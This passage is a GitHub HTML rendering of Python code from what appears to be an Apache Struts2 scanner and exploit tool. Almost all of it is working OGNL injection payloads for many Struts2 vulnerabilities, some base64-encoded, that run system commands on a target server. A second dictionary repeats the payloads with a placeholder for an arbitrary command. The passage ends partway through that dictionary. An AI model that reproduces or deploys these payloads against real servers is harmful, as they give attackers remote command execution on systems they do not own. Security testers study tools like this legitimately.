        <td id="LC17" class="blob-code blob-code-inner js-file-line">    <span class="pl-s"><span class="pl-pds">&quot;</span>Accept<span class="pl-pds">&quot;</span></span>:<span class="pl-s"><span class="pl-pds">&quot;</span>application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*<span class="pl-pds">&quot;</span></span>,</td>
      </tr>
      <tr>
        <td id="L18" class="blob-num js-line-number" data-line-number="18"></td>
        <td id="LC18" class="blob-code blob-code-inner js-file-line">    <span class="pl-s"><span class="pl-pds">&quot;</span>User-Agent<span class="pl-pds">&quot;</span></span>:<span class="pl-s"><span class="pl-pds">&quot;</span>Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50<span class="pl-pds">&quot;</span></span>, </td>
      </tr>
      <tr>
        <td id="L19" class="blob-num js-line-number" data-line-number="19"></td>
        <td id="LC19" class="blob-code blob-code-inner js-file-line">    <span class="pl-s"><span class="pl-pds">&quot;</span>Content-Type<span class="pl-pds">&quot;</span></span>:<span class="pl-s"><span class="pl-pds">&quot;</span>application/x-www-form-urlencoded<span class="pl-pds">&quot;</span></span></td>
      </tr>
      <tr>
        <td id="L20" class="blob-num js-line-number" data-line-number="20"></td>
        <td id="LC20" class="blob-code blob-code-inner js-file-line">}</td>
      </tr>
      <tr>
        <td id="L21" class="blob-num js-line-number" data-line-number="21"></td>
        <td id="LC21" class="blob-code blob-code-inner js-file-line">headers2 <span class="pl-k">=</span> {</td>
      </tr>
      <tr>
        <td id="L22" class="blob-num js-line-number" data-line-number="22"></td>
        <td id="LC22" class="blob-code blob-code-inner js-file-line">     <span class="pl-s"><span class="pl-pds">&quot;</span>User-Agent<span class="pl-pds">&quot;</span></span>:<span class="pl-s"><span class="pl-pds">&quot;</span>Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50<span class="pl-pds">&quot;</span></span>,</td>
      </tr>
      <tr>
        <td id="L23" class="blob-num js-line-number" data-line-number="23"></td>
        <td id="LC23" class="blob-code blob-code-inner js-file-line">     <span class="pl-s"><span class="pl-pds">&quot;</span>Accept<span class="pl-pds">&quot;</span></span>:<span class="pl-s"><span class="pl-pds">&quot;</span>application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*<span class="pl-pds">&quot;</span></span>,</td>
      </tr>
      <tr>
        <td id="L24" class="blob-num js-line-number" data-line-number="24"></td>
        <td id="LC24" class="blob-code blob-code-inner js-file-line">     <span class="pl-s"><span class="pl-pds">&quot;</span>Content-Type<span class="pl-pds">&quot;</span></span>:<span class="pl-s"><span class="pl-pds">&quot;</span>%{(#nike=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;netstat -an&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}<span class="pl-pds">&quot;</span></span></td>
      </tr>
      <tr>
        <td id="L25" class="blob-num js-line-number" data-line-number="25"></td>
        <td id="LC25" class="blob-code blob-code-inner js-file-line">}</td>
      </tr>
      <tr>
        <td id="L26" class="blob-num js-line-number" data-line-number="26"></td>
        <td id="LC26" class="blob-code blob-code-inner js-file-line">headers3 <span class="pl-k">=</span> {</td>
      </tr>
      <tr>
        <td id="L27" class="blob-num js-line-number" data-line-number="27"></td>
        <td id="LC27" class="blob-code blob-code-inner js-file-line">     <span class="pl-s"><span class="pl-pds">&quot;</span>User-Agent<span class="pl-pds">&quot;</span></span>:<span class="pl-s"><span class="pl-pds">&quot;</span>Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50<span class="pl-pds">&quot;</span></span>,</td>
      </tr>
      <tr>
        <td id="L28" class="blob-num js-line-number" data-line-number="28"></td>
        <td id="LC28" class="blob-code blob-code-inner js-file-line">     <span class="pl-s"><span class="pl-pds">&quot;</span>Accept<span class="pl-pds">&quot;</span></span>:<span class="pl-s"><span class="pl-pds">&quot;</span>application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*<span class="pl-pds">&quot;</span></span>,</td>
      </tr>
      <tr>
        <td id="L29" class="blob-num js-line-number" data-line-number="29"></td>
        <td id="LC29" class="blob-code blob-code-inner js-file-line">     <span class="pl-s"><span class="pl-pds">&quot;</span>Content-Type<span class="pl-pds">&quot;</span></span>:<span class="pl-s"><span class="pl-pds">&quot;</span>%{(#szgx=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;netstat -an&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.close())}<span class="pl-pds">&quot;</span></span></td>
      </tr>
      <tr>
        <td id="L30" class="blob-num js-line-number" data-line-number="30"></td>
        <td id="LC30" class="blob-code blob-code-inner js-file-line">}</td>
      </tr>
      <tr>
        <td id="L31" class="blob-num js-line-number" data-line-number="31"></td>
        <td id="LC31" class="blob-code blob-code-inner js-file-line">headers_052 <span class="pl-k">=</span> {</td>
      </tr>
      <tr>
        <td id="L32" class="blob-num js-line-number" data-line-number="32"></td>
        <td id="LC32" class="blob-code blob-code-inner js-file-line">    <span class="pl-s"><span class="pl-pds">&quot;</span>Accept<span class="pl-pds">&quot;</span></span>:<span class="pl-s"><span class="pl-pds">&quot;</span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="pl-pds">&quot;</span></span>,</td>
      </tr>
      <tr>
        <td id="L33" class="blob-num js-line-number" data-line-number="33"></td>
        <td id="LC33" class="blob-code blob-code-inner js-file-line">    <span class="pl-s"><span class="pl-pds">&quot;</span>User-Agent<span class="pl-pds">&quot;</span></span>:<span class="pl-s"><span class="pl-pds">&quot;</span>Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50<span class="pl-pds">&quot;</span></span>, </td>
      </tr>
      <tr>
        <td id="L34" class="blob-num js-line-number" data-line-number="34"></td>
        <td id="LC34" class="blob-code blob-code-inner js-file-line">    <span class="pl-s"><span class="pl-pds">&quot;</span>Content-Type<span class="pl-pds">&quot;</span></span>:<span class="pl-s"><span class="pl-pds">&quot;</span>application/xml<span class="pl-pds">&quot;</span></span></td>
      </tr>
      <tr>
        <td id="L35" class="blob-num js-line-number" data-line-number="35"></td>
        <td id="LC35" class="blob-code blob-code-inner js-file-line">}</td>
      </tr>
      <tr>
        <td id="L36" class="blob-num js-line-number" data-line-number="36"></td>
        <td id="LC36" class="blob-code blob-code-inner js-file-line"><span class="pl-k">class</span> <span class="pl-en">struts_baseverify</span>:</td>
      </tr>
      <tr>
        <td id="L37" class="blob-num js-line-number" data-line-number="37"></td>
        <td id="LC37" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">def</span> <span class="pl-c1">__init__</span>(<span class="pl-smi"><span class="pl-smi">self</span></span>, <span class="pl-smi">url</span>):</td>
      </tr>
      <tr>
        <td id="L38" class="blob-num js-line-number" data-line-number="38"></td>
        <td id="LC38" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">self</span>.url <span class="pl-k">=</span> url</td>
      </tr>
      <tr>
        <td id="L39" class="blob-num js-line-number" data-line-number="39"></td>
        <td id="LC39" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">self</span>.poc <span class="pl-k">=</span> {</td>
      </tr>
      <tr>
        <td id="L40" class="blob-num js-line-number" data-line-number="40"></td>
        <td id="LC40" class="blob-code blob-code-inner js-file-line">                <span class="pl-s"><span class="pl-pds">&quot;</span>ST2-005<span class="pl-pds">&quot;</span></span>:base64.b64decode(<span class="pl-s"><span class="pl-pds">&quot;</span>KCdcNDNfbWVtYmVyQWNjZXNzLmFsbG93U3RhdGljTWV0aG9kQWNjZXNzJykoYSk9dHJ1ZSYoYikoKCdcNDNjb250ZXh0W1wneHdvcmsuTWV0aG9kQWNjZXNzb3IuZGVueU1ldGhvZEV4ZWN1dGlvblwnXVw3NWZhbHNlJykoYikpJignXDQzYycpKCgnXDQzX21lbWJlckFjY2Vzcy5leGNsdWRlUHJvcGVydGllc1w3NUBqYXZhLnV0aWwuQ29sbGVjdGlvbnNARU1QVFlfU0VUJykoYykpJihnKSgoJ1w0M215Y21kXDc1XCduZXRzdGF0IC1hblwnJykoZCkpJihoKSgoJ1w0M215cmV0XDc1QGphdmEubGFuZy5SdW50aW1lQGdldFJ1bnRpbWUoKS5leGVjKFw0M215Y21kKScpKGQpKSYoaSkoKCdcNDNteWRhdFw3NW5ld1w0MGphdmEuaW8uRGF0YUlucHV0U3RyZWFtKFw0M215cmV0LmdldElucHV0U3RyZWFtKCkpJykoZCkpJihqKSgoJ1w0M215cmVzXDc1bmV3XDQwYnl0ZVs1MTAyMF0nKShkKSkmKGspKCgnXDQzbXlkYXQucmVhZEZ1bGx5KFw0M215cmVzKScpKGQpKSYobCkoKCdcNDNteXN0clw3NW5ld1w0MGphdmEubGFuZy5TdHJpbmcoXDQzbXlyZXMpJykoZCkpJihtKSgoJ1w0M215b3V0XDc1QG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpJykoZCkpJihuKSgoJ1w0M215b3V0LmdldFdyaXRlcigpLnByaW50bG4oXDQzbXlzdHIpJykoZCkp<span class="pl-pds">&quot;</span></span>),</td>
      </tr>
      <tr>
        <td id="L41" class="blob-num js-line-number" data-line-number="41"></td>
        <td id="LC41" class="blob-code blob-code-inner js-file-line">                <span class="pl-s"><span class="pl-pds">&quot;</span>ST2-009<span class="pl-pds">&quot;</span></span>:<span class="pl-s"><span class="pl-pds">&#39;&#39;&#39;</span>class.classLoader.jarPath=<span class="pl-c1">%28%</span>23context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]<span class="pl-c1">%3d</span>+new+java.lang.Boolean<span class="pl-c1">%28f</span>alse<span class="pl-c1">%29%</span>2c+%23_memberAccess[&quot;allowStaticMethodAccess&quot;]<span class="pl-c1">%3d</span>true<span class="pl-c1">%2c</span>+<span class="pl-c1">%23a%3d</span>%40java.lang.Runtime<span class="pl-c1">%40g</span>etRuntime<span class="pl-c1">%28%</span>29.exec<span class="pl-c1">%28%</span>27netstat -an<span class="pl-c1">%27%</span>29.getInputStream<span class="pl-c1">%28%</span>29<span class="pl-c1">%2c</span>%23b<span class="pl-c1">%3d</span>new+java.io.InputStreamReader<span class="pl-c1">%28%</span>23a<span class="pl-c1">%29%</span>2c<span class="pl-c1">%23c%3d</span>new+java.io.BufferedReader<span class="pl-c1">%28%</span>23b<span class="pl-c1">%29%</span>2c<span class="pl-c1">%23d%3d</span>new+char[50000]<span class="pl-c1">%2c%23c</span>.read<span class="pl-c1">%28%</span>23d<span class="pl-c1">%29%</span>2c<span class="pl-c1">%23s</span>btest<span class="pl-c1">%3d%40o</span>rg.apache.struts2.ServletActionContext<span class="pl-c1">%40g</span>etResponse<span class="pl-c1">%28%</span>29.getWriter<span class="pl-c1">%28%</span>29<span class="pl-c1">%2c%23s</span>btest.println<span class="pl-c1">%28%</span>23d<span class="pl-c1">%29%</span>2c<span class="pl-c1">%23s</span>btest.close<span class="pl-c1">%28%</span>29<span class="pl-c1">%29%</span>28meh%29&amp;z[<span class="pl-c1">%28c</span>lass.classLoader.jarPath<span class="pl-c1">%29%</span>28%27meh<span class="pl-c1">%27%</span>29]<span class="pl-pds">&#39;&#39;&#39;</span></span>,</td>
      </tr>
      <tr>
        <td id="L42" class="blob-num js-line-number" data-line-number="42"></td>
        <td id="LC42" class="blob-code blob-code-inner js-file-line">                <span class="pl-s"><span class="pl-pds">&quot;</span>ST2-013<span class="pl-pds">&quot;</span></span>:base64.b64decode(<span class="pl-s"><span class="pl-pds">&quot;</span>YT0xJHsoJTIzX21lbWJlckFjY2Vzc1siYWxsb3dTdGF0aWNNZXRob2RBY2Nlc3MiXT10cnVlLCUyM2E9QGphdmEubGFuZy5SdW50aW1lQGdldFJ1bnRpbWUoKS5leGVjKCduZXRzdGF0IC1hbicpLmdldElucHV0U3RyZWFtKCksJTIzYj1uZXcramF2YS5pby5JbnB1dFN0cmVhbVJlYWRlciglMjNhKSwlMjNjPW5ldytqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyKCUyM2IpLCUyM2Q9bmV3K2NoYXJbNTAwMDBdLCUyM2MucmVhZCglMjNkKSwlMjNzYnRlc3Q9QG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpLmdldFdyaXRlcigpLCUyM3NidGVzdC5wcmludGxuKCUyM2QpLCUyM3NidGVzdC5jbG9zZSgpKX0=<span class="pl-pds">&quot;</span></span>),</td>
      </tr>
      <tr>
        <td id="L43" class="blob-num js-line-number" data-line-number="43"></td>
        <td id="LC43" class="blob-code blob-code-inner js-file-line">                <span class="pl-s"><span class="pl-pds">&quot;</span>ST2-016<span class="pl-pds">&quot;</span></span>:base64.b64decode(<span class="pl-s"><span class="pl-pds">&quot;</span>cmVkaXJlY3Q6JHslMjNyZXElM2QlMjNjb250ZXh0LmdldCglMjdjbyUyNyUyYiUyN20ub3BlbiUyNyUyYiUyN3N5bXBob255Lnh3byUyNyUyYiUyN3JrMi5kaXNwJTI3JTJiJTI3YXRjaGVyLkh0dHBTZXIlMjclMmIlMjd2bGV0UmVxJTI3JTJiJTI3dWVzdCUyNyksJTIzcyUzZG5ldyUyMGphdmEudXRpbC5TY2FubmVyKChuZXclMjBqYXZhLmxhbmcuUHJvY2Vzc0J1aWxkZXIoJTI3bmV0c3RhdCUyMC1hbiUyNy50b1N0cmluZygpLnNwbGl0KCUyN1xccyUyNykpKS5zdGFydCgpLmdldElucHV0U3RyZWFtKCkpLnVzZURlbGltaXRlciglMjdcXEElMjcpLCUyM3N0ciUzZCUyM3MuaGFzTmV4dCgpPyUyM3MubmV4dCgpOiUyNyUyNywlMjNyZXNwJTNkJTIzY29udGV4dC5nZXQoJTI3Y28lMjclMmIlMjdtLm9wZW4lMjclMmIlMjdzeW1waG9ueS54d28lMjclMmIlMjdyazIuZGlzcCUyNyUyYiUyN2F0Y2hlci5IdHRwU2VyJTI3JTJiJTI3dmxldFJlcyUyNyUyYiUyN3BvbnNlJTI3KSwlMjNyZXNwLnNldENoYXJhY3RlckVuY29kaW5nKCUyN1VURi04JTI3KSwlMjNyZXNwLmdldFdyaXRlcigpLnByaW50bG4oJTIzc3RyKSwlMjNyZXNwLmdldFdyaXRlcigpLmZsdXNoKCksJTIzcmVzcC5nZXRXcml0ZXIoKS5jbG9zZSgpfQ==<span class="pl-pds">&quot;</span></span>),</td>
      </tr>
      <tr>
        <td id="L44" class="blob-num js-line-number" data-line-number="44"></td>
        <td id="LC44" class="blob-code blob-code-inner js-file-line">                <span class="pl-s"><span class="pl-pds">&quot;</span>ST2-019<span class="pl-pds">&quot;</span></span>:base64.b64decode(<span class="pl-s"><span class="pl-pds">&quot;</span>ZGVidWc9Y29tbWFuZCZleHByZXNzaW9uPSNmPSNfbWVtYmVyQWNjZXNzLmdldENsYXNzKCkuZ2V0RGVjbGFyZWRGaWVsZCgnYWxsb3dTdGF0aWNNZXRob2RBY2Nlc3MnKSwjZi5zZXRBY2Nlc3NpYmxlKHRydWUpLCNmLnNldCgjX21lbWJlckFjY2Vzcyx0cnVlKSwjcmVxPUBvcmcuYXBhY2hlLnN0cnV0czIuU2VydmxldEFjdGlvbkNvbnRleHRAZ2V0UmVxdWVzdCgpLCNyZXNwPUBvcmcuYXBhY2hlLnN0cnV0czIuU2VydmxldEFjdGlvbkNvbnRleHRAZ2V0UmVzcG9uc2UoKS5nZXRXcml0ZXIoKSwjYT0obmV3IGphdmEubGFuZy5Qcm9jZXNzQnVpbGRlcihuZXcgamF2YS5sYW5nLlN0cmluZ1tdeyduZXRzdGF0JywnLWFuJ30pKS5zdGFydCgpLCNiPSNhLmdldElucHV0U3RyZWFtKCksI2M9bmV3IGphdmEuaW8uSW5wdXRTdHJlYW1SZWFkZXIoI2IpLCNkPW5ldyBqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyKCNjKSwjZT1uZXcgY2hhclsxMDAwMF0sI2QucmVhZCgjZSksI3Jlc3AucHJpbnRsbigjZSksI3Jlc3AuY2xvc2UoKQ==<span class="pl-pds">&quot;</span></span>),</td>
      </tr>
      <tr>
        <td id="L45" class="blob-num js-line-number" data-line-number="45"></td>
        <td id="LC45" class="blob-code blob-code-inner js-file-line">                <span class="pl-s"><span class="pl-pds">&quot;</span>ST2-devmode<span class="pl-pds">&quot;</span></span>:<span class="pl-s"><span class="pl-pds">&#39;&#39;&#39;</span>?debug=browser&amp;object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)<span class="pl-c1">%3f</span>(<span class="pl-c1">%23c</span>ontext%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;command=netstat%20-an<span class="pl-pds">&#39;&#39;&#39;</span></span>,</td>
      </tr>
      <tr>
        <td id="L46" class="blob-num js-line-number" data-line-number="46"></td>
        <td id="LC46" class="blob-code blob-code-inner js-file-line">                <span class="pl-s"><span class="pl-pds">&quot;</span>ST2-032<span class="pl-pds">&quot;</span></span>:<span class="pl-s"><span class="pl-pds">&#39;&#39;&#39;</span>?method:%23_memberAccess<span class="pl-c1">%3d</span>@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,<span class="pl-c1">%23r</span>es<span class="pl-c1">%3d%40o</span>rg.apache.struts2.ServletActionContext<span class="pl-c1">%40g</span>etResponse(),<span class="pl-c1">%23r</span>es.setCharacterEncoding(%23parameters.encoding[0]),%23w<span class="pl-c1">%3d%23r</span>es.getWriter(),<span class="pl-c1">%23s%3d</span>new+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),<span class="pl-c1">%23s</span>tr<span class="pl-c1">%3d%23s</span>.hasNext()<span class="pl-c1">%3f%23s</span>.next()<span class="pl-c1">%3a</span>%23parameters.ppp[0],%23w.print(<span class="pl-c1">%23s</span>tr),%23w.close(),1?<span class="pl-c1">%23x</span>x:<span class="pl-c1">%23r</span>equest.toString&amp;cmd=netstat -an&amp;pp=____A&amp;ppp=%20&amp;encoding=UTF-8<span class="pl-pds">&#39;&#39;&#39;</span></span>, </td>
      </tr>
      <tr>
        <td id="L47" class="blob-num js-line-number" data-line-number="47"></td>
        <td id="LC47" class="blob-code blob-code-inner js-file-line">                <span class="pl-s"><span class="pl-pds">&quot;</span>ST2-033<span class="pl-pds">&quot;</span></span>:<span class="pl-s"><span class="pl-pds">&#39;&#39;&#39;</span>/%23_memberAccess<span class="pl-c1">%3d</span>@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,<span class="pl-c1">%23x</span>x<span class="pl-c1">%3d</span>123,<span class="pl-c1">%23r</span>s<span class="pl-c1">%3d</span>@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr<span class="pl-c1">%3d%23c</span>ontext[%23parameters.obj[0]].getWriter(),%23wr.print(<span class="pl-c1">%23r</span>s),%23wr.close(),<span class="pl-c1">%23x</span>x.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=netstat -an<span class="pl-pds">&#39;&#39;&#39;</span></span>,</td>
      </tr>
      <tr>
        <td id="L48" class="blob-num js-line-number" data-line-number="48"></td>
        <td id="LC48" class="blob-code blob-code-inner js-file-line">                <span class="pl-s"><span class="pl-pds">&quot;</span>ST2-037<span class="pl-pds">&quot;</span></span>:<span class="pl-s"><span class="pl-pds">&#39;&#39;&#39;</span>/(%23_memberAccess<span class="pl-c1">%3d</span>@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)<span class="pl-c1">%3f</span>(%23wr<span class="pl-c1">%3d%23c</span>ontext%5b%23parameters.obj%5b0<span class="pl-c1">%5d%5d</span>.getWriter(),<span class="pl-c1">%23r</span>s<span class="pl-c1">%3d</span>@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(<span class="pl-c1">%23r</span>s),%23wr.flush(),%23wr.close()):xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=16456&amp;command=netstat -an<span class="pl-pds">&#39;&#39;&#39;</span></span>,</td>
      </tr>
      <tr>
        <td id="L49" class="blob-num js-line-number" data-line-number="49"></td>
        <td id="LC49" class="blob-code blob-code-inner js-file-line">                <span class="pl-s"><span class="pl-pds">&quot;</span>ST2-045<span class="pl-pds">&quot;</span></span>:<span class="pl-s"><span class="pl-pds">&quot;</span><span class="pl-pds">&quot;</span></span>,</td>
      </tr>
      <tr>
        <td id="L50" class="blob-num js-line-number" data-line-number="50"></td>
        <td id="LC50" class="blob-code blob-code-inner js-file-line">                &quot;ST2-052&quot;:&#39;&#39;&#39;&lt;map&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt; &lt;dataHandler&gt; &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt; &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt; &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt; &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;command&gt; &lt;string&gt;whoami&lt;/string&gt;&lt;/command&gt; &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;done&gt;false&lt;/done&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;false&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;/entry&gt; &lt;/map&gt; &#39;&#39;&#39;,</td>
      </tr>
      <tr>
        <td id="L51" class="blob-num js-line-number" data-line-number="51"></td>
        <td id="LC51" class="blob-code blob-code-inner js-file-line">                }</td>
      </tr>
      <tr>
        <td id="L52" class="blob-num js-line-number" data-line-number="52"></td>
        <td id="LC52" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">self</span>.shell <span class="pl-k">=</span> {</td>
      </tr>
      <tr>
        <td id="L53" class="blob-num js-line-number" data-line-number="53"></td>
        <td id="LC53" class="blob-code blob-code-inner js-file-line">                <span class="pl-s"><span class="pl-pds">&quot;</span>struts2-005<span class="pl-pds">&quot;</span></span>:base64.b64decode(<span class="pl-s"><span class="pl-pds">&quot;</span>KCdcNDNfbWVtYmVyQWNjZXNzLmFsbG93U3RhdGljTWV0aG9kQWNjZXNzJykoYSk9dHJ1ZSYoYikoKCdcNDNjb250ZXh0W1wneHdvcmsuTWV0aG9kQWNjZXNzb3IuZGVueU1ldGhvZEV4ZWN1dGlvblwnXVw3NWZhbHNlJykoYikpJignXDQzYycpKCgnXDQzX21lbWJlckFjY2Vzcy5leGNsdWRlUHJvcGVydGllc1w3NUBqYXZhLnV0aWwuQ29sbGVjdGlvbnNARU1QVFlfU0VUJykoYykpJihnKSgoJ1w0M215Y21kXDc1XCdGVVpaSU5HQ09NTUFORFwnJykoZCkpJihoKSgoJ1w0M215cmV0XDc1QGphdmEubGFuZy5SdW50aW1lQGdldFJ1bnRpbWUoKS5leGVjKFw0M215Y21kKScpKGQpKSYoaSkoKCdcNDNteWRhdFw3NW5ld1w0MGphdmEuaW8uRGF0YUlucHV0U3RyZWFtKFw0M215cmV0LmdldElucHV0U3RyZWFtKCkpJykoZCkpJihqKSgoJ1w0M215cmVzXDc1bmV3XDQwYnl0ZVs1MTAyMF0nKShkKSkmKGspKCgnXDQzbXlkYXQucmVhZEZ1bGx5KFw0M215cmVzKScpKGQpKSYobCkoKCdcNDNteXN0clw3NW5ld1w0MGphdmEubGFuZy5TdHJpbmcoXDQzbXlyZXMpJykoZCkpJihtKSgoJ1w0M215b3V0XDc1QG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpJykoZCkpJihuKSgoJ1w0M215b3V0LmdldFdyaXRlcigpLnByaW50bG4oXDQzbXlzdHIpJykoZCkp<span class="pl-pds">&quot;</span></span>),</td>
      </tr>
      <tr>
        <td id="L54" class="blob-num js-line-number" data-line-number="54"></td>
        <td id="LC54" class="blob-code blob-code-inner js-file-line">                <span class="pl-s"><span class="pl-pds">&quot;</span>struts2-009<span class="pl-pds">&quot;</span></span>:<span class="pl-s"><span class="pl-pds">&#39;&#39;&#39;</span>class.classLoader.jarPath=<span class="pl-c1">%28%</span>23context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]<span class="pl-c1">%3d</span>+new+java.lang.Boolean<span class="pl-c1">%28f</span>alse<span class="pl-c1">%29%</span>2c+%23_memberAccess[&quot;allowStaticMethodAccess&quot;]<span class="pl-c1">%3d</span>true<span class="pl-c1">%2c</span>+<span class="pl-c1">%23a%3d</span>%40java.lang.Runtime<span class="pl-c1">%40g</span>etRuntime<span class="pl-c1">%28%</span>29.exec<span class="pl-c1">%28%</span>27FUZZINGCOMMAND<span class="pl-c1">%27%</span>29.getInputStream<span class="pl-c1">%28%</span>29<span class="pl-c1">%2c</span>%23b<span class="pl-c1">%3d</span>new+java.io.InputStreamReader<span class="pl-c1">%28%</span>23a<span class="pl-c1">%29%</span>2c<span class="pl-c1">%23c%3d</span>new+java.io.BufferedReader<span class="pl-c1">%28%</span>23b<span class="pl-c1">%29%</span>2c<span class="pl-c1">%23d%3d</span>new+char[50000]<span class="pl-c1">%2c%23c</span>.read<span class="pl-c1">%28%</span>23d<span class="pl-c1">%29%</span>2c<span class="pl-c1">%23s</span>btest<span class="pl-c1">%3d%40o</span>rg.apache.struts2.ServletActionContext<span 